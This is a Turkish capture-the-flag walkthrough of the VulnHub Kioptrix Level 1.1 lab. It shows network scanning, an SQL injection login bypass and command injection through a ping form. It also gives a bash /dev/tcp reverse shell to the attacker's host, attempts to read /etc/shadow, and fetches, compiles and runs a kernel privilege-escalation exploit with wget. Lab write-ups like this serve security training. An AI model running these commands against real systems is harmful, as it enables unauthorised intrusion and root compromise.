Arkadaşlar merhaba;

Bu yazımda vulnhub.com üzerinde yayınlanmış olan Kioptrix1.1#2 makinasının çözümünü anlatmaya çalışacağım.

###### Linkler : ######
	
http://www.kioptrix.com
https://www.vulnhub.com/entry/kioptrix-level-11-2,23/

###### Çözüm : ######

İlk olarak benim kullandığım VMware’da Kali’mi ve Kioptrix’i ayaklandırıyorum. Tabi ki de yapacağım ilk işlem hedef makinamın IP adresini bulmak olacak. Bunun için ilk önce Kali makinamın IP adresini buluyorum.

    $ ifconfig
![IP Adresi Bulma](/Kioptrix1.1-2/pics/1.png "ifconfig")

Daha sonra Kali’min bulunduğu scope taki IP’leri tarayarak devam ediyorum. 

	$ netdiscover -i eth0 -r 192.168.1.0/24
![Scope Tarama](/Kioptrix1.1-2/pics/2.png "netdiscover")

Ve gördüğümüz gibi IP adresim geldi😊 IP adresimi bulduktan sonra yapacağımız şey hemen bir nmap taraması yapmak olacak ki açık portlardan zafiyet bulabilecek miyim kontrol etmeliyim.
	
	$ nmap -sS -sV 192.168.1.22
![Port Tarama](/Kioptrix1.1-2/pics/3.png "nmap")

Gördüğümüz gibi açık 6 adet port bulunmakta. Burada hemen 80 portunda çalışan http servisi dikkatimi çekiyor ve tarayıcımdan hedef makinanın IP adresini girerek web sitesinde ne var ona bakıyorum. 

![Http Servisi](/Kioptrix1.1-2/pics/4.png "Http Servisi")

Ve karşıma bir admin paneli geliyor. MySQL servisi kullanıldığını da bildiğim için (3306 portu) hemen sql injection denemesi yapıyorum 😊
Bu noktada sayfanın arka planda aşağıdaki gibi bir SQL Query kullandığını düşünerek 

	SELECT * FROM users WHERE username='' AND password=''

Aşağıdaki sql injection kodunu username ve password bölümlerine girerek ,
	
	1’ or ‘1’=’1

Sorguyu aşağıdaki şekle getirmeyi amaçlıyorum:


	SELECT * FROM users WHERE username='1' or '1'='1' AND password='1' or '1'='1'

Eğer tahminim doğruysa basitçe username 1 ise veya 1=1 ise ve password de 1 veya 1=1 ise beni içeri al demiş oluyorum😊 ki herkesin bildiği gibi 1=1 her zaman doğrudur ve sorguyu bu şekilde bypass etmiş olurum.
![Ping Panel](/Kioptrix1.1-2/pics/5.png "Ping Panel")

Mükemmel!  Sorguyu aştık.😊 Karşıma ping atmak için bir komut paneli geldi. Kendi hostuma ping atarak deniyorum.
![Ping Try](/Kioptrix1.1-2/pics/6.png "Ping Try")

Evet ping komutu doğru çalışıyor ve gelen sayfadan gördüğüm üzere (url’ye bakabilirsiniz /pingit.php) sayfa php kodları ile çalışıyor. Ben de hemen bir ; koyarak bypass denemesi yapıyorum.
    
    $whoami
![whoami](/Kioptrix1.1-2/pics/7.png "whoami")

Oldu! 😊 Sistem komutlarını çalıştırabildiğimi görüyorum ve ilk önce parolaları bulabileceğim /etc/passwd ve /etc/shadow dosyalarını okumaya çalışıyorum.

![etc](/Kioptrix1.1-2/pics/8.png "etc")
![etc](/Kioptrix1.1-2/pics/9.png "etc")

Resimlerden görüldüğü üzere /etc/shadow dosyasını okuyamıyorum. Başka bir yol denemem lazım.
Ben de Reverse Shell almayı deniyorum. 
İlk önce netcat ile 443 portumu dinlemeye açıyorum.

    $ nc -nvlp 443
    
![netcat](/Kioptrix1.1-2/pics/10.png "netcat")

Daha sonra reverse Shell almak için pentestmonkey.net sitesinden bash shellini alıyorum ve kendime göre düzenleyip sitedeki ping command promptuma yazıyorum.

    $ bash -i >& /dev/tcp/192.168.1.22/443 0>&1 (Buradaki ip adresi kalimin ip’si ve port da dinlemeye açtığım port.)
Submit butonuna bastığımda hedef makinaya bağlantı sağlandığını ve yetkisiz bir Shell ile komut çalıştırabildiğimi görüyorum 😊

![Reverse Shell](/Kioptrix1.1-2/pics/11.png "Reverse Shell")

Şimdi yapmam gereken yetki yükseltip sistemde root olmaya çalışmak. Aşağıdaki komutları çalıştırarak hedef makinamın hangi işletim sistemini kullandığını ve versiyon bilgilerini öğreniyorum.

    $  cat /etc/*-release
    $  cat /proc/version
![Version](/Kioptrix1.1-2/pics/12.png "Version")

Versiyon bilgilerini de öğrendiğime göre internette ufak bir Google search ile bu Linux versiyonunda yetki yükseltme sağlayan https://www.exploit-db.com/exploits/9542/ bu exploiti buluyorum. Şimdi exploitimi kendi Kali’me indirip hedef makinaya kendi Kali’mden wget ile çekiyorum.
Bunu yapmak için indirdiğim exploiti kendi Kali’mde /var/www/html dosyasına atıp apache servisimi başlatıyorum ki wget ile ulaşabileceğim internete açık bir sunucu olsun.

    $ service apache2 start ( Bunu kendi Kali’mde yapıyorum. )
    $ cd /tmp ( tmp dizinine geçiyorum ki dosya yazıp okuyabileceğim bir yer olmalı. Bunu hedef makinada yapıyorum exploiti çekeceğim yer burası olacak. )
    $ wget http://192.168.1.23/9542.c ( Bunu Shell ile ulaştığım hedef makinada yapıyorum. )
![wget](/Kioptrix1.1-2/pics/13.png "wget")

Şimdi hedef makinaya yüklediğim exploit kodu C dilinde yazılmış olduğu için GCC ile compile ediyorum ve kodumu çalıştırıyorum. ( Artık exploiti hedef makinaya çektiğim için GCC ile compile ve kodu çalıştırma işlemlerimi hedef makina üzerinde yapıyorum. )

    $ gcc 9542.c 
    $ ./a.out
Daha sonra `whoami` komutu çalıştırdığımda sistemde artık root olduğumuzu görebiliriz.

    $ whoami
![root](/Kioptrix1.1-2/pics/14.png "root")
